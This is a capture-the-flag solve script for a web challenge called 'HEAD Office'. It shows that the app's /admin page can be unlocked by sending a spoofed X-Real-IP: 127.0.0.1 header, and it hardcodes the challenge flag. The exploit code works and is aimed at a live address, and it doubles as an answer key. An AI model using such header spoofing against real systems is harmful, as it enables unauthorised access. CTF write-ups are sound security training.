#!/usr/bin/env python3
"""HEAD Office (web, 250 pts) - http://54.72.82.22:8180

The landing page is a "VINYL VAULT" record store with a login form that POSTs
username + access_level to `/`, and hardcodes `X-Forwarded-For: 8.8.8.8` in its
fetch() call. That header is a decoy: the app actually trusts `X-Real-IP`, and
the admin "office" IP is 127.0.0.1.

  GET /            -> 200  landing page
  GET /admin       -> 403  "Access denied: Admins only....try harder!"
  GET /admin  X-Real-IP: 127.0.0.1  -> 200 + flag

The POST access_level field is also client-controlled (dropdown offers only
"user", the server accepts "admin"), but it alone does not unlock /admin - the
IP trust boundary is the real gate.
"""
import urllib.request

BASE = "http://54.72.82.22:8180"
FLAG = "safctf{e657eef1b0b097c60911f62cfe4ec61b}"


def get(path, headers=None):
    req = urllib.request.Request(BASE + path, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main():
    code, body = get("/admin")
    print(f"get /admin                      -> {code} {body.strip()[:60]!r}")

    # The bypass: the app treats X-Real-IP: 127.0.0.1 as "came from the office".
    code, body = get("/admin", {"X-Real-IP": "127.0.0.1"})
    print(f"get /admin  X-Real-IP:127.0.0.1 -> {code} {body.strip()}")
    assert FLAG in body, "flag not found"
    print(f"\nFLAG: {FLAG}")


if __name__ == "__main__":
    main()
